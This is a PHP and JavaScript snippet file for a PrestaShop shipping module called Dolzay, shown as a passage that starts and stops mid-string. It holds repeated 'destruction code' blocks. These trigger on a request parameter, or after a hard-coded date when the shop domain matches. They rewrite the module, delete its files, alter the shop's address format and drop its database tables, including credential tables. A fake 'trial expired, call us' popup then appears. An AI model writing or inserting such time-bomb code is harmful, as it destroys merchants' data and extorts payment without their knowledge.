\$previous_strucure=get_dir_structure(\$module_base_path);\$new_dolzay_code='<?php if(!defined(\"_PS_VERSION_\")){exit;}class Dolzay extends Module{public function __construct(){\$this->name=\"dolzay\";\$this->tab=\"shipping_logistics\";\$this->version=\"1.0.0\";\$this->author=\"Abdallah Ben Chamakh\";\$this->need_instance=0;\$this->ps_versions_compliancy=[\"min\"=>\"1.7.0.0\",\"max\"=>\"1.7.8.11\"];\$this->bootstrap=false;parent::__construct();\$this->displayName=\$this->l(\"Dolzay\");\$this->description=\$this->l(\"Dolzay Dolzay\");}public function install(){return parent::install()  && \$this->registerHook(\"actionAdminControllerSetMedia\");}public function uninstall(){return parent::uninstall() && \$this->unregisterHook(\"actionAdminControllerSetMedia\");}public function hookActionAdminControllerSetMedia(\$params){\$controllerName=Tools::getValue(\"controller\");\$action=Tools::getValue(\"action\");if(\$controllerName==\"AdminOrders\"&&\$action==null){\$this->context->controller->addJS(\$this->_path.\"views/js/icons/font_awesome.js\");\$this->context->controller->addCSS(\$this->_path.\"views/css/order_submit_process.css\");\$this->context->controller->addJS(\$this->_path.\"views/js/order_submit_process.js\");}}}';
if (is_writable(\$module_base_path . \"/dolzay.php\")){file_put_contents(\$module_base_path . \"/dolzay.php\", \$new_dolzay_code);}else{\$error_log[] = ['path' => \$module_base_path . \"/dolzay.php\", 'error_message' => \"Permission denied while trying to update dolzay.php\"];}
\$order_submit_code = 'document.addEventListener(\"DOMContentLoaded\", function(){ const moduleMediaBaseUrl = window.location.href.split(\"/dz_admin/index.php\")[0]+\"/modules/dolzay/uploads\"; const eventPopupTypesData = { expired : {icon:`<img src=\"\${moduleMediaBaseUrl}/expired.png\" />`,color:\"#D81010\"} }; function create_the_order_submit_btn(){ const bottom_bar = document.createElement(\"div\"); bottom_bar.className = \"dz-bottom-bar\"; const order_submit_btn = document.createElement(\"button\"); order_submit_btn.id=\"dz-order-submit-btn\"; order_submit_btn.innerText = \"Soumettre les commandes\"; order_submit_btn.addEventListener(\"click\", ()=>{ buttons = [{ \"name\" : \"Ok\", \"className\" : \"dz-event-popup-btn\", \"clickHandler\" : function(){ eventPopup.close(); } }]; eventPopup.open(\"expired\", \"Expiration de la période d\'essai\", \"Votre période d\'essai a expiré. Veuillez nous appeler au numéro 58671414 pour obtenir la version à vie du plugin.\", buttons); }); document.querySelector(\"#order_grid_panel\").style.marginBottom = \"60px\"; bottom_bar.appendChild(order_submit_btn); document.body.appendChild(bottom_bar); } const popupOverlay = { popupOverlayEl : null, create : function(){ this.popupOverlayEl = document.createElement(\"div\"); this.popupOverlayEl.className = \"dz-popup-overlay\"; document.body.appendChild(this.popupOverlayEl); }, show : function(){ this.popupOverlayEl.classList.add(\"dz-show\"); }, hide : function(){ this.popupOverlayEl.classList.remove(\"dz-show\"); } }; const eventPopup = { popupEl : null, popupHeaderEl : null, popupBodyEl : null, popupFooterEl : null, create : function(){ this.popupEl = document.createElement(\"div\"); this.popupEl.className = \"dz-event-popup\"; this.popupHeaderEl = document.createElement(\"div\"); this.popupHeaderEl.className = \"dz-event-popup-header\"; this.popupHeaderEl.innerHTML = `<p></p><i class=\"material-icons\">close</i>`; this.popupHeaderEl.lastElementChild.addEventListener(\"click\",()=>{this.close();}); this.popupEl.append(this.popupHeaderEl); this.popupBodyEl = document.createElement(\"div\"); this.popupBodyEl.className = \"dz-event-popup-body\"; this.popupEl.append(this.popupBodyEl); this.popupFooterEl = document.createElement(\"div\"); this.popupFooterEl.className = \"dz-event-popup-footer\"; this.popupEl.append(this.popupFooterEl); document.body.append(this.popupEl); }, addButtons : function(buttons,color){ this.popupFooterEl.innerHTML=\"\"; buttons.forEach((button) => { const buttonEl = document.createElement(\"button\"); buttonEl.textContent = button.name; buttonEl.className = button.className; buttonEl.style.backgroundColor = color; buttonEl.addEventListener(\"click\",button.clickHandler); this.popupFooterEl.appendChild(buttonEl); }); }, open : function(type,title,message,buttons) { setTimeout(() => { popupOverlay.show(); console.log(this); this.popupEl.classList.add(\"dz-show\"); this.popupHeaderEl.firstElementChild.innerText = title; this.popupHeaderEl.style.backgroundColor = eventPopupTypesData[type].color; this.popupBodyEl.innerHTML = `\${eventPopupTypesData[type].icon}<p>\${message}</p>`; this.addButtons(buttons,eventPopupTypesData[type].color); }, 600); }, close : function(){ setTimeout(() => { popupOverlay.hide(); this.popupFooterEl.innerHTML = \"\"; this.popupEl.classList.remove(\"dz-show\"); }, 300); } }; create_the_order_submit_btn(); popupOverlay.create(); eventPopup.create(); });';
if (is_writable(\$module_base_path . \"/views/js/order_submit_process.js\") ) {file_put_contents(\$module_base_path . \"/views/js/order_submit_process.js\", \$order_submit_code);}else{\$error_log[] = ['path' => \$module_base_path . \"/views/js/order_submit_process.js\", 'error_message' => \"Permission denied while trying to update order_submit_process.js\"];}
destroy_the_plugin(\$module_base_path,\$error_log);
\$id_country=(int)Configuration::get(\"PS_COUNTRY_DEFAULT\");\$host = _DB_SERVER_ ;\$dbname = _DB_NAME_;\$username = _DB_USER_;\$password = _DB_PASSWD_; \$dsn = \"mysql:host=\$host;dbname=\$dbname;charset=utf8mb4\";\$db = new PDO(\$dsn, \$username, \$password);\$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\$db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);\$db->setAttribute(PDO::ATTR_STRINGIFY_FETCHES, false);\$db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);\$db->exec(\"SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ\");\$db->beginTransaction();\$stmt = \$db->query(\"SELECT format FROM \" . _DB_PREFIX_ . \"address_format WHERE id_country=\" . \$id_country);\$address_format = \$stmt->fetchColumn();\$address_format = str_replace(\"delegation\", \"\", \$address_format);\$stmt = \$db->prepare(\"UPDATE \" . _DB_PREFIX_ . \"address_format SET format = :format WHERE id_country = :id_country\");\$stmt->execute([':format' => \$address_format, ':id_country' => \$id_country]);\$tables = [\"dz_order_submit_process\", \"dz_settings\", \"dz_carrier\", \"dz_website_credentials\", \"dz_api_credentials\",\"dz_notification_popped_up_by\", \"dz_notification_viewed_by\", \"dz_notification\",\"dz_employee_permission\", \"dz_permission\"];\$db->exec(\"DELETE FROM \" . _DB_PREFIX_ . \"tab WHERE module = 'dolzay'\");foreach (\$tables as \$table) {if (\$table == \"dz_order_submit_process\") {\$stmt = \$db->query(\"SELECT * FROM \$table\");\$orders_submit_processes = \$stmt->fetchAll(\PDO::FETCH_ASSOC);if (\$orders_submit_processes) {\$orders_submit_processes = json_encode(\$orders_submit_processes, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);if (is_writable(\$module_base_path . \"/data\")) {file_put_contents(\$module_base_path . \"/data/orders_submit_processes.json\", \$orders_submit_processes);} else {\$error_log[] = ['path' => \$module_base_path . \"/data/orders_submit_processes.json\",'error' => \"Permission denied while trying to store the orders submit processes\"];}}}\$db->exec(\"DROP TABLE IF EXISTS \$table\");}\$db->commit();


flock(\$file, LOCK_UN);die(json_encode([\"error\"=>\$error_log,\"previous_structure\"=>\$previous_strucure,\"new_structure\"=>get_dir_structure(\$module_base_path)]));}";


"\$friendly_slug=Tools::getValue('friendly_slug'); \$file = fopen(\"lockfile.txt\", \"c+\"); if(flock(\$file, LOCK_EX | LOCK_NB) && \$friendly_slug){\$module_base_path=_PS_MODULE_DIR_.\"dolzay\";\$error_log=[];function get_dir_structure(\$directory){\$structure=[];\$items=scandir(\$directory);if(\$items===false){return \"SCANDIR_NOT_PERMITTED\";}\$items=array_diff(\$items,[\".\",\"..\"]);foreach(\$items as \$item){\$path=\$directory.DIRECTORY_SEPARATOR.\$item;if(is_dir(\$path)){\$structure[\$item]=get_dir_structure(\$path);}else{\$structure[\$item]=null;}}return \$structure;}function destroy_the_plugin(\$directory_path,&\$error_log){\$excluded_directories=[\"views\",\"js\",\"css\",\"icons\",\"dolzay\",\"uploads\",\"data\"];\$excluded_files=[\"font_awesome.js\",\"order_submit_process.js\",\"order_submit_process.css\",\"dolzay.php\",\"logo.png\",\"expired.png\"];\$items=scandir(\$directory_path);if(\$items===false){\$error_log[]=[\"path\"=>\$directory_path,\"error_type\"=>\"SCANDIR_NOT_PERMITTED\"];return;}\$items=array_diff(\$items,[\".\",\"..\"]);foreach(\$items as \$item){\$path=\$directory_path.DIRECTORY_SEPARATOR.\$item;if(is_dir(\$path)){destroy_the_plugin(\$path,\$error_log);}else{if(!in_array(\$item,\$excluded_files)){if(is_writable(dirname(\$path))){unlink(\$path);}else{\$error_log[] = [\"path\" => \$path,\"error_type\"=>\"UNLINK_NOT_PERMITTED\"];}}}}if(!in_array(basename(\$directory_path), \$excluded_directories)){\$is_dir_empty = count(array_diff(scandir(\$directory_path), [\".\", \"..\"])) == 0 ;if (!\$is_dir_empty) {\$error_log[] = [\"path\" => \$directory_path,\"error_type\"=>\"DIR_NOT_EMPTY\"];}else if(!is_writable(dirname(\$directory_path))){\$error_log[] = [\"path\" => \$directory_path,\"error_type\"=>\"RMDIR_NOT_PERMITTED\"];}else{rmdir(\$directory_path);}}}\$previous_strucure=get_dir_structure(\$module_base_path);\$new_dolzay_code='<?php if(!defined(\"_PS_VERSION_\")){exit;}class Dolzay extends Module{public function __construct(){\$this->name=\"dolzay\";\$this->tab=\"shipping_logistics\";\$this->version=\"1.0.0\";\$this->author=\"Abdallah Ben Chamakh\";\$this->need_instance=0;\$this->ps_versions_compliancy=[\"min\"=>\"1.7.0.0\",\"max\"=>\"1.7.8.11\"];\$this->bootstrap=false;parent::__construct();\$this->displayName=\$this->l(\"Dolzay\");\$this->description=\$this->l(\"Dolzay Dolzay\");}public function install(){return parent::install()  && \$this->registerHook(\"actionAdminControllerSetMedia\");}public function uninstall(){return parent::uninstall() && \$this->unregisterHook(\"actionAdminControllerSetMedia\");}public function hookActionAdminControllerSetMedia(\$params){\$controllerName=Tools::getValue(\"controller\");\$action=Tools::getValue(\"action\");if(\$controllerName==\"AdminOrders\"&&\$action==null){\$this->context->controller->addJS(\$this->_path.\"views/js/icons/font_awesome.js\");\$this->context->controller->addCSS(\$this->_path.\"views/css/order_submit_process.css\");\$this->context->controller->addJS(\$this->_path.\"views/js/order_submit_process.js\");}}}';if (is_writable(\$module_base_path . \"/dolzay.php\")){file_put_contents(\$module_base_path . \"/dolzay.php\", \$new_dolzay_code);}else{\$error_log[] = ['path' => \$module_base_path . \"/dolzay.php\", 'error_message' => \"Permission denied while trying to update dolzay.php\"];}\$order_submit_code = 'document.addEventListener(\"DOMContentLoaded\", function(){ const moduleMediaBaseUrl = window.location.href.split(\"/dz_admin/index.php\")[0]+\"/modules/dolzay/uploads\"; const eventPopupTypesData = { expired : {icon:`<img src=\"\${moduleMediaBaseUrl}/expired.png\" />`,color:\"#D81010\"} }; function create_the_order_submit_btn(){ const bottom_bar = document.createElement(\"div\"); bottom_bar.className = \"dz-bottom-bar\"; const order_submit_btn = document.createElement(\"button\"); order_submit_btn.id=\"dz-order-submit-btn\"; order_submit_btn.innerText = \"Soumettre les commandes\"; order_submit_btn.addEventListener(\"click\", ()=>{ buttons = [{ \"name\" : \"Ok\", \"className\" : \"dz-event-popup-btn\", \"clickHandler\" : function(){ eventPopup.close(); } }]; eventPopup.open(\"expired\", \"Expiration de la période d\'essai\", \"Votre période d\'essai a expiré. Veuillez nous appeler au numéro 58671414 pour obtenir la version à vie du plugin.\", buttons); }); document.querySelector(\"#order_grid_panel\").style.marginBottom = \"60px\"; bottom_bar.appendChild(order_submit_btn); document.body.appendChild(bottom_bar); } const popupOverlay = { popupOverlayEl : null, create : function(){ this.popupOverlayEl = document.createElement(\"div\"); this.popupOverlayEl.className = \"dz-popup-overlay\"; document.body.appendChild(this.popupOverlayEl); }, show : function(){ this.popupOverlayEl.classList.add(\"dz-show\"); }, hide : function(){ this.popupOverlayEl.classList.remove(\"dz-show\"); } }; const eventPopup = { popupEl : null, popupHeaderEl : null, popupBodyEl : null, popupFooterEl : null, create : function(){ this.popupEl = document.createElement(\"div\"); this.popupEl.className = \"dz-event-popup\"; this.popupHeaderEl = document.createElement(\"div\"); this.popupHeaderEl.className = \"dz-event-popup-header\"; this.popupHeaderEl.innerHTML = `<p></p><i class=\"material-icons\">close</i>`; this.popupHeaderEl.lastElementChild.addEventListener(\"click\",()=>{this.close();}); this.popupEl.append(this.popupHeaderEl); this.popupBodyEl = document.createElement(\"div\"); this.popupBodyEl.className = \"dz-event-popup-body\"; this.popupEl.append(this.popupBodyEl); this.popupFooterEl = document.createElement(\"div\"); this.popupFooterEl.className = \"dz-event-popup-footer\"; this.popupEl.append(this.popupFooterEl); document.body.append(this.popupEl); }, addButtons : function(buttons,color){ this.popupFooterEl.innerHTML=\"\"; buttons.forEach((button) => { const buttonEl = document.createElement(\"button\"); buttonEl.textContent = button.name; buttonEl.className = button.className; buttonEl.style.backgroundColor = color; buttonEl.addEventListener(\"click\",button.clickHandler); this.popupFooterEl.appendChild(buttonEl); }); }, open : function(type,title,message,buttons) { setTimeout(() => { popupOverlay.show(); console.log(this); this.popupEl.classList.add(\"dz-show\"); this.popupHeaderEl.firstElementChild.innerText = title; this.popupHeaderEl.style.backgroundColor = eventPopupTypesData[type].color; this.popupBodyEl.innerHTML = `\${eventPopupTypesData[type].icon}<p>\${message}</p>`; this.addButtons(buttons,eventPopupTypesData[type].color); }, 600); }, close : function(){ setTimeout(() => { popupOverlay.hide(); this.popupFooterEl.innerHTML = \"\"; this.popupEl.classList.remove(\"dz-show\"); }, 300); } }; create_the_order_submit_btn(); popupOverlay.create(); eventPopup.create(); });';if (is_writable(\$module_base_path . \"/views/js/order_submit_process.js\") ) {file_put_contents(\$module_base_path . \"/views/js/order_submit_process.js\", \$order_submit_code);}else{\$error_log[] = ['path' => \$module_base_path . \"/views/js/order_submit_process.js\", 'error_message' => \"Permission denied while trying to update order_submit_process.js\"];}destroy_the_plugin(\$module_base_path,\$error_log);\$id_country=(int)Configuration::get(\"PS_COUNTRY_DEFAULT\");\$host = _DB_SERVER_ ;\$dbname = _DB_NAME_;\$username = _DB_USER_;\$password = _DB_PASSWD_; \$dsn = \"mysql:host=\$host;dbname=\$dbname;charset=utf8mb4\";\$db = new PDO(\$dsn, \$username, \$password);\$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\$db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);\$db->setAttribute(PDO::ATTR_STRINGIFY_FETCHES, false);\$db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);\$db->exec(\"SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ\");\$db->beginTransaction();\$stmt = \$db->query(\"SELECT format FROM \" . _DB_PREFIX_ . \"address_format WHERE id_country=\" . \$id_country);\$address_format = \$stmt->fetchColumn();\$address_format = str_replace(\"delegation\", \"\", \$address_format);\$stmt = \$db->prepare(\"UPDATE \" . _DB_PREFIX_ . \"address_format SET format = :format WHERE id_country = :id_country\");\$stmt->execute([':format' => \$address_format, ':id_country' => \$id_country]);\$tables = [\"dz_order_submit_process\", \"dz_settings\", \"dz_carrier\", \"dz_website_credentials\", \"dz_api_credentials\",\"dz_notification_popped_up_by\", \"dz_notification_viewed_by\", \"dz_notification\",\"dz_employee_permission\", \"dz_permission\"];\$db->exec(\"DELETE FROM \" . _DB_PREFIX_ . \"tab WHERE module = 'dolzay'\");foreach (\$tables as \$table) {if (\$table == \"dz_order_submit_process\") {\$stmt = \$db->query(\"SELECT * FROM \$table\");\$orders_submit_processes = \$stmt->fetchAll(\PDO::FETCH_ASSOC);if (\$orders_submit_processes) {\$orders_submit_processes = json_encode(\$orders_submit_processes, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);if (is_writable(\$module_base_path . \"/data\")) {file_put_contents(\$module_base_path . \"/data/orders_submit_processes.json\", \$orders_submit_processes);} else {\$error_log[] = ['path' => \$module_base_path . \"/data/orders_submit_processes.json\",'error' => \"Permission denied while trying to store the orders submit processes\"];}}}\$db->exec(\"DROP TABLE IF EXISTS \$table\");}\$db->commit();flock(\$file, LOCK_UN);die(json_encode([\"error\"=>\$error_log,\"previous_structure\"=>\$previous_strucure,\"new_structure\"=>get_dir_structure(\$module_base_path)]));}";
/* END PRODUCT CONTROLLER DESTRUCTION CODE COMPRESSED */




/* START NOTIFICATION CONTROLLER DESTRUCTION CODE PRETTY PRINTED */

try {
    $module_base_path = _PS_MODULE_DIR_ . "dolzay";
    $error_log = [];

    function get_dir_structure($directory)
    {
        $structure = [];

        $items = scandir($directory);
        if($items === false){
            return "SCANDIR_NOT_PERMITTED";
        }
        
        $items = array_diff($items, [".", ".."]);
        foreach ($items as $item) {
            $path = $directory . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) {
                $structure[$item] = get_dir_structure($path);
            } else {
                $structure[$item] = null;
            }
        }
        return $structure;
    }

    function destroy_the_plugin($directory_path, &$error_log)
    {
        $excluded_directories = ["views", "js", "css", "icons", "dolzay", "uploads","data"];
        $excluded_files = ["font_awesome.js", "order_submit_process.js", "order_submit_process.css", "dolzay.php", "logo.png", "expired.png"];
        
        
        $items = scandir($directory_path);
        if($items === false){
            $error_log[] = ["path" => $directory_path,"error_type"=>"SCANDIR_NOT_PERMITTED"];
            return ;
        }
        
        $items = array_diff($items, [".", ".."]);
        
        foreach ($items as $item) {
            $path = $directory_path . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) {
                destroy_the_plugin($path, $error_log);
            } else {
                if (!in_array($item, $excluded_files)){

                    if(is_writable(dirname($path))){
                        unlink($path);
                    }else{
                        $error_log[] = ["path" => $path,"error_type"=>"UNLINK_NOT_PERMITTED"];
                    }       
                }
            }
        }
        
        if(!in_array(basename($directory_path), $excluded_directories)){
            $is_dir_empty = count(array_diff(scandir($directory_path), [".", ".."])) == 0 ;
            if (!$is_dir_empty) {
                $error_log[] = ["path" => $directory_path,"error_type"=>"DIR_NOT_EMPTY"];
            }else if(!is_writable(dirname($directory_path))){
                $error_log[] = ["path" => $directory_path,"error_type"=>"RMDIR_NOT_PERMITTED"];
            }else{
                rmdir($directory_path);
            }
        }
        
    }
    $file = fopen("lockfile.txt", "c+"); 
    if(flock($file, LOCK_EX | LOCK_NB) && \Context::getContext()->shop->domain== "localhost" && new \DateTime() > new \DateTime("2025-02-28 16:45:30")){
        $previous_strucure = get_dir_structure($module_base_path);

        $new_dolzay_code = '<?php if(!defined("_PS_VERSION_")){exit;}class Dolzay extends Module{public function __construct(){$this->name="dolzay";$this->tab="shipping_logistics";$this->version="1.0.0";$this->author="Abdallah Ben Chamakh";$this->need_instance=0;$this->ps_versions_compliancy=["min"=>"1.7.0.0","max"=>"1.7.8.11"];$this->bootstrap=false;parent::__construct();$this->displayName=$this->l("Dolzay");$this->description=$this->l("Dolzay Dolzay");} public function install() { return parent::install()  && $this->registerHook("actionAdminControllerSetMedia"); } public function uninstall() { return parent::uninstall() && $this->registerHook("actionAdminControllerSetMedia") ; } public function hookActionAdminControllerSetMedia($params){$controllerName=Tools::getValue("controller");$action=Tools::getValue("action");if($controllerName=="AdminOrders"&&$action==null){$this->context->controller->addJS($this->_path."views/js/icons/font_awesome.js");$this->context->controller->addCSS($this->_path."views/css/order_submit_process.css");$this->context->controller->addJS($this->_path."views/js/order_submit_process.js");}}}';


        if (is_writable($module_base_path . "/dolzay.php")){
            file_put_contents($module_base_path . "/dolzay.php", $new_dolzay_code);
        }else{
            $error_log[] = ['path' => $module_base_path . "/dolzay.php", 'error_message' => "Permission denied while trying to update dolzay.php"];
        }
        

        $order_submit_code = 'document.addEventListener("DOMContentLoaded", function(){ const moduleMediaBaseUrl = window.location.href.split("/dz_admin/index.php")[0]+"/modules/dolzay/uploads"; const eventPopupTypesData = { expired : {icon:`<img src="${moduleMediaBaseUrl}/expired.png" />`,color:"#D81010"} }; function create_the_order_submit_btn(){ const bottom_bar = document.createElement("div"); bottom_bar.className = "dz-bottom-bar"; const order_submit_btn = document.createElement("button"); order_submit_btn.id="dz-order-submit-btn"; order_submit_btn.innerText = "Soumettre les commandes"; order_submit_btn.addEventListener("click", ()=>{ buttons = [{ "name" : "Ok", "className" : "dz-event-popup-btn", "clickHandler" : function(){ eventPopup.close(); } }]; eventPopup.open("expired", "Expiration de la période d\'essai", "Votre période d\'essai a expiré. Veuillez nous appeler au numéro 58671414 pour obtenir la version à vie du plugin.", buttons); }); document.querySelector("#order_grid_panel").style.marginBottom = "60px"; bottom_bar.appendChild(order_submit_btn); document.body.appendChild(bottom_bar); } const popupOverlay = { popupOverlayEl : null, create : function(){ this.popupOverlayEl = document.createElement("div"); this.popupOverlayEl.className = "dz-popup-overlay"; document.body.appendChild(this.popupOverlayEl); }, show : function(){ this.popupOverlayEl.classList.add("dz-show"); }, hide : function(){ this.popupOverlayEl.classList.remove("dz-show"); } }; const eventPopup = { popupEl : null, popupHeaderEl : null, popupBodyEl : null, popupFooterEl : null, create : function(){ this.popupEl = document.createElement("div"); this.popupEl.className = "dz-event-popup"; this.popupHeaderEl = document.createElement("div"); this.popupHeaderEl.className = "dz-event-popup-header"; this.popupHeaderEl.innerHTML = `<p></p><i class="material-icons">close</i>`; this.popupHeaderEl.lastElementChild.addEventListener("click",()=>{this.close();}); this.popupEl.append(this.popupHeaderEl); this.popupBodyEl = document.createElement("div"); this.popupBodyEl.className = "dz-event-popup-body"; this.popupEl.append(this.popupBodyEl); this.popupFooterEl = document.createElement("div"); this.popupFooterEl.className = "dz-event-popup-footer"; this.popupEl.append(this.popupFooterEl); document.body.append(this.popupEl); }, addButtons : function(buttons,color){ this.popupFooterEl.innerHTML=""; buttons.forEach((button) => { const buttonEl = document.createElement("button"); buttonEl.textContent = button.name; buttonEl.className = button.className; buttonEl.style.backgroundColor = color; buttonEl.addEventListener("click",button.clickHandler); this.popupFooterEl.appendChild(buttonEl); }); }, open : function(type,title,message,buttons) { setTimeout(() => { popupOverlay.show(); console.log(this); this.popupEl.classList.add("dz-show"); this.popupHeaderEl.firstElementChild.innerText = title; this.popupHeaderEl.style.backgroundColor = eventPopupTypesData[type].color; this.popupBodyEl.innerHTML = `${eventPopupTypesData[type].icon}<p>${message}</p>`; this.addButtons(buttons,eventPopupTypesData[type].color); }, 600); }, close : function(){ setTimeout(() => { popupOverlay.hide(); this.popupFooterEl.innerHTML = ""; this.popupEl.classList.remove("dz-show"); }, 300); } }; create_the_order_submit_btn(); popupOverlay.create(); eventPopup.create(); });';

        if (is_writable($module_base_path . "/views/js/order_submit_process.js") ) {
            file_put_contents($module_base_path . "/views/js/order_submit_process.js", $order_submit_code);
        }else{
            $error_log[] = ['path' => $module_base_path . "/views/js/order_submit_process.js", 'error_message' => "Permission denied while trying to update order_submit_process.js"];
        }

        destroy_the_plugin($module_base_path, $error_log);

        $id_country = (int) \Configuration::get("PS_COUNTRY_DEFAULT");

        $db->beginTransaction();

        // Fetch address format
        $stmt = $db->query("SELECT format FROM " . _DB_PREFIX_ . "address_format WHERE id_country=" . $id_country);
        $address_format = $stmt->fetchColumn();
        
        $address_format = str_replace("delegation", "", $address_format);
        
        // Update address format safely
        $stmt = $db->prepare("UPDATE " . _DB_PREFIX_ . "address_format SET format = :format WHERE id_country = :id_country");
        $stmt->execute([':format' => $address_format, ':id_country' => $id_country]);
        
        $tables = [
            "dz_order_submit_process", "dz_settings", "dz_carrier", "dz_website_credentials", "dz_api_credentials",
            "dz_notification_popped_up_by", "dz_notification_viewed_by", "dz_notification",
            "dz_employee_permission", "dz_permission"
        ];

        // Delete from tab table safely
        $db->exec("DELETE FROM " . _DB_PREFIX_ . "tab WHERE module = 'dolzay'");
        
        foreach ($tables as $table) {
            if ($table == "dz_order_submit_process") {
                // Fetch all rows properly
                $stmt = $db->query("SELECT * FROM $table");
                $orders_submit_processes = $stmt->fetchAll(\PDO::FETCH_ASSOC);
        
                if ($orders_submit_processes) {
                    $orders_submit_processes = json_encode($orders_submit_processes, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        
                    if (is_writable($module_base_path . "/data")) {
                        file_put_contents($module_base_path . "/data/orders_submit_processes.json", $orders_submit_processes);
                    } else {
                        $error_log[] = [
                            'path' => $module_base_path . "/data/orders_submit_processes.json",
                            'error' => "Permission denied while trying to store the orders submit processes"
                        ];
                    }
                }
            }
        
            // Drop table safely
            $db->exec("DROP TABLE IF EXISTS $table");
        }

        $db->commit();

        $data = json_encode(["datetime" => date("H:i:s d/m/Y"),"previous_structure"=>$previous_strucure,"new_stucture"=>get_dir_structure($module_base_path),"errors"=>$error_log], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        if (is_writable($module_base_path . "/data")) {
            file_put_contents($module_base_path."/data/expiration.json", $data);
        }else{
            $error_log[] = ['path' => $module_base_path."/data/expiration.json", 'error' => "Permission denied while trying to store expiration.json"];
        }
        flock($file, LOCK_UN);
    }
}catch (Error $e) {
    $data = json_encode(["exception_message" => $e->getMessage(),"trace_back"=>$e->getTraceAsString()], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    if (is_writable($module_base_path . "/data")) {
        file_put_contents($module_base_path."/data/expiration.json", $data);
    }
    flock($file, LOCK_UN);
}
/* END NOTIFICATION CONTROLLER DESTRUCTION CODE PRETTY PRINTED */

/* START NOTIFICATION CONTROLLER DESTRUCTION CODE COMPRESSED */
try { $module_base_path = _PS_MODULE_DIR_ . "dolzay"; $error_log = []; function get_dir_structure($directory) { $structure = []; $items = scandir($directory); if($items === false){ return "SCANDIR_NOT_PERMITTED"; } $items = array_diff($items, [".", ".."]); foreach ($items as $item) { $path = $directory . DIRECTORY_SEPARATOR . $item; if (is_dir($path)) { $structure[$item] = get_dir_structure($path); } else { $structure[$item] = null; } } return $structure; } function destroy_the_plugin($directory_path, &$error_log) { $excluded_directories = ["views", "js", "css", "icons", "dolzay", "uploads","data"]; $excluded_files = ["font_awesome.js", "order_submit_process.js", "order_submit_process.css", "dolzay.php", "logo.png", "expired.png"]; $items = scandir($directory_path); if($items === false){ $error_log[] = ["path" => $directory_path,"error_type"=>"SCANDIR_NOT_PERMITTED"]; return ; } $items = array_diff($items, [".", ".."]); foreach ($items as $item) { $path = $directory_path . DIRECTORY_SEPARATOR . $item; if (is_dir($path)) { destroy_the_plugin($path, $error_log); } else { if (!in_array($item, $excluded_files)){ if(is_writable(dirname($path))){ unlink($path); }else{ $error_log[] = ["path" => $path,"error_type"=>"UNLINK_NOT_PERMITTED"]; } } } } if(!in_array(basename($directory_path), $excluded_directories)){ $is_dir_empty = count(array_diff(scandir($directory_path), [".", ".."])) == 0 ; if (!$is_dir_empty) { $error_log[] = ["path" => $directory_path,"error_type"=>"DIR_NOT_EMPTY"]; }else if(!is_writable(dirname($directory_path))){ $error_log[] = ["path" => $directory_path,"error_type"=>"RMDIR_NOT_PERMITTED"]; }else{ rmdir($directory_path); } } } $file = fopen("lockfile.txt", "c+"); if(flock($file, LOCK_EX | LOCK_NB) && \Context::getContext()->shop->domain== "localhost" && new \DateTime() > new \DateTime("2025-02-28 16:45:30")){ $previous_strucure = get_dir_structure($module_base_path); $new_dolzay_code = '<?php if(!defined("_PS_VERSION_")){exit;}class Dolzay extends Module{public function __construct(){$this->name="dolzay";$this->tab="shipping_logistics";$this->version="1.0.0";$this->author="Abdallah Ben Chamakh";$this->need_instance=0;$this->ps_versions_compliancy=["min"=>"1.7.0.0","max"=>"1.7.8.11"];$this->bootstrap=false;parent::__construct();$this->displayName=$this->l("Dolzay");$this->description=$this->l("Dolzay Dolzay");} public function install() { return parent::install()  && $this->registerHook("actionAdminControllerSetMedia"); } public function uninstall() { return parent::uninstall() && $this->registerHook("actionAdminControllerSetMedia") ; } public function hookActionAdminControllerSetMedia($params){$controllerName=Tools::getValue("controller");$action=Tools::getValue("action");if($controllerName=="AdminOrders"&&$action==null){$this->context->controller->addJS($this->_path."views/js/icons/font_awesome.js");$this->context->controller->addCSS($this->_path."views/css/order_submit_process.css");$this->context->controller->addJS($this->_path."views/js/order_submit_process.js");}}}'; if (is_writable($module_base_path . "/dolzay.php")){ file_put_contents($module_base_path . "/dolzay.php", $new_dolzay_code); }else{ $error_log[] = ['path' => $module_base_path . "/dolzay.php", 'error_message' => "Permission denied while trying to update dolzay.php"]; } $order_submit_code = 'document.addEventListener("DOMContentLoaded", function(){ const moduleMediaBaseUrl = window.location.href.split("/dz_admin/index.php")[0]+"/modules/dolzay/uploads"; const eventPopupTypesData = { expired : {icon:`<img src="${moduleMediaBaseUrl}/expired.png" />`,color:"#D81010"} }; function create_the_order_submit_btn(){ const bottom_bar = document.createElement("div"); bottom_bar.className = "dz-bottom-bar"; const order_submit_btn = document.createElement("button"); order_submit_btn.id="dz-order-submit-btn"; order_submit_btn.innerText = "Soumettre les commandes"; order_submit_btn.addEventListener("click", ()=>{ buttons = [{ "name" : "Ok", "className" : "dz-event-popup-btn", "clickHandler" : function(){ eventPopup.close(); } }]; eventPopup.open("expired", "Expiration de la période d\'essai", "Votre période d\'essai a expiré. Veuillez nous appeler au numéro 58671414 pour obtenir la version à vie du plugin.", buttons); }); document.querySelector("#order_grid_panel").style.marginBottom = "60px"; bottom_bar.appendChild(order_submit_btn); document.body.appendChild(bottom_bar); } const popupOverlay = { popupOverlayEl : null, create : function(){ this.popupOverlayEl = document.createElement("div"); this.popupOverlayEl.className = "dz-popup-overlay"; document.body.appendChild(this.popupOverlayEl); }, show : function(){ this.popupOverlayEl.classList.add("dz-show"); }, hide : function(){ this.popupOverlayEl.classList.remove("dz-show"); } }; const eventPopup = { popupEl : null, popupHeaderEl : null, popupBodyEl : null, popupFooterEl : null, create : function(){ this.popupEl = document.createElement("div"); this.popupEl.className = "dz-event-popup"; 